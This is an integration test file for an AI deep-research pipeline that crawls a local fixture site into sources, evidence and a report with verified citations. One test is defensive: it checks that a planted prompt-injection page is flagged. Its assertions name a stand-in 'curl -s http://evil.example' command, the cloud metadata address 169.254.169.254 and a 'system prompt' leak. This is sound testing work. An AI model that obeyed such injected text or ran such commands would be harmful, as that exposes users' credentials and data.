import { afterAll, beforeAll, describe, expect, it } from "vitest";
import bcrypt from "bcryptjs";
import { bootstrapDatabase, getPrisma, disconnectPrisma, type DatabaseBootstrapResult } from "@omni/database";
import { newId } from "@omni/shared";
import { executeRun } from "../src/run-executor.js";
import { startFixtureServer, type FixtureServer } from "../../../fixtures/serve-lib.js";

/**
 * Full-pipeline integration test: real Crawlee crawl of the local fixture
 * site → sources → evidence → report → verified citations, using the mock
 * provider and a real PostgreSQL (embedded fallback when Docker isn't up).
 */
let db: DatabaseBootstrapResult;
let server: FixtureServer;
let base: string;
let projectId: string;
let runId: string;

beforeAll(async () => {
  process.env.OMNI_ALLOW_LOOPBACK_FOR_TESTS = "1";
  process.env.AI_PROVIDER = "mock";
  db = await bootstrapDatabase({ migrate: true });
  server = await startFixtureServer(0);
  base = `http://127.0.0.1:${server.port}`;

  const prisma = getPrisma();
  const user = await prisma.user.create({
    data: {
      id: newId("usr"),
      email: `it-${Date.now()}@local.test`,
      passwordHash: await bcrypt.hash("integration-test-pw", 4),
      displayName: "Integration Tester",
    },
  });
  const project = await prisma.project.create({
    data: {
      id: newId("prj"),
      ownerId: user.id,
      title: "Integration: learning science",
      mode: "deep-research",
      prompt: "Research how spaced repetition and study techniques improve retention.",
      maxSources: 5,
      storeFullText: true,
      provider: "mock",
      startingUrls: [
        `${base}/articles/spaced-repetition.html`,
        `${base}/articles/learning-science.html`,
        `${base}/articles/injection-attempt.html`,
        `${base}/private/secret.html`,
      ],
      topics: { create: [{ id: newId("top"), name: "Spaced repetition", order: 0 }] },
    },
  });
  projectId = project.id;
  const run = await prisma.researchRun.create({
    data: { id: newId("run"), projectId, status: "running", startedAt: new Date() },
  });
  runId = run.id;
  await executeRun(prisma, runId);
}, 300_000);

afterAll(async () => {
  await server?.close();
  await disconnectPrisma();
  await db?.stop?.();
  delete process.env.OMNI_ALLOW_LOOPBACK_FOR_TESTS;
});

describe("research pipeline end to end (mock provider, real crawl, real DB)", () => {
  it("completes the run with real stage progress", async () => {
    const prisma = getPrisma();
    const run = await prisma.researchRun.findUniqueOrThrow({ where: { id: runId } });
    expect(run.error).toBeNull();
    expect(run.status).toBe("completed");
    expect(run.stage).toBe("complete");
    const events = await prisma.runEvent.findMany({ where: { runId } });
    const stages = new Set(events.map((e) => e.stage));
    for (const required of ["building-plan", "crawling", "extracting-evidence", "verifying-citations"]) {
      expect(stages, `missing stage ${required}`).toContain(required);
    }
  });

  it("saves sources and skips the robots-disallowed page", async () => {
    const prisma = getPrisma();
    const sources = await prisma.source.findMany({ where: { projectId } });
    expect(sources.length).toBeGreaterThanOrEqual(3);
    expect(sources.every((s) => !s.url.includes("/private/"))).toBe(true);
    const skipped = await prisma.crawlRequest.findFirst({
      where: { runId, url: { contains: "/private/secret" } },
    });
    expect(skipped?.status).toBe("skipped");
    expect(skipped?.skipReason).toContain("robots");
  });

  it("connects evidence to sources with verbatim excerpts", async () => {
    const prisma = getPrisma();
    const evidence = await prisma.evidence.findMany({ where: { projectId }, include: { source: { include: { snapshots: true } } } });
    expect(evidence.length).toBeGreaterThan(0);
    for (const record of evidence) {
      const snapshot = record.source.snapshots.find((s) => s.kind === "main-text");
      expect(snapshot, `evidence ${record.id} has no snapshot`).toBeTruthy();
      const normalize = (s: string) => s.replace(/\s+/g, " ").toLowerCase();
      expect(normalize(snapshot!.contentText)).toContain(normalize(record.evidenceText));
    }
  });

  it("produces a report whose citations are verified against stored content", async () => {
    const prisma = getPrisma();
    const report = await prisma.report.findFirstOrThrow({
      where: { projectId },
      include: { citations: true, sections: true },
    });
    expect(report.verifiedAt).toBeTruthy();
    expect(report.sections.length).toBeGreaterThan(1);
    expect(report.citations.length).toBeGreaterThan(0);
    expect(report.citations.every((c) => c.verified)).toBe(true);
    // Every marker used in the text corresponds to a stored citation.
    const markers = new Set(report.citations.map((c) => c.marker));
    for (const section of report.sections) {
      for (const match of section.contentMd.matchAll(/\[(\d{1,3})\]/g)) {
        expect(markers, `dangling marker [${match[1]}] in "${section.title}"`).toContain(Number(match[1]));
      }
    }
  });

  it("treats prompt-injection text as inert data (flagged, never executed)", async () => {
    const prisma = getPrisma();
    // The injection page was crawled; its instruction text must not appear as
    // commands in the report, and no crawl of the metadata endpoint happened.
    const report = await prisma.report.findFirstOrThrow({ where: { projectId }, include: { sections: true } });
    const fullText = report.sections.map((s) => s.contentMd).join("\n");
    expect(fullText).not.toContain("curl -s http://evil.example");
    expect(fullText.toLowerCase()).not.toContain("system prompt");
    const metadataCrawl = await prisma.crawlRequest.findFirst({
      where: { runId, url: { contains: "169.254.169.254" } },
    });
    expect(metadataCrawl).toBeNull();
    // Injection attempt was detected and logged for transparency.
    const flagEvent = await prisma.runEvent.findFirst({
      where: { runId, message: { contains: "instruction-like text" } },
    });
    expect(flagEvent).toBeTruthy();
  });

  it("cancels a queued run and preserves data", async () => {
    const prisma = getPrisma();
    const run2 = await prisma.researchRun.create({
      data: { id: newId("run"), projectId, status: "running", startedAt: new Date(), cancelRequested: true },
    });
    await executeRun(prisma, run2.id);
    const final = await prisma.researchRun.findUniqueOrThrow({ where: { id: run2.id } });
    expect(final.status).toBe("cancelled");
    // Prior run's data untouched.
    expect(await prisma.source.count({ where: { projectId } })).toBeGreaterThan(0);
  }, 120_000);
});
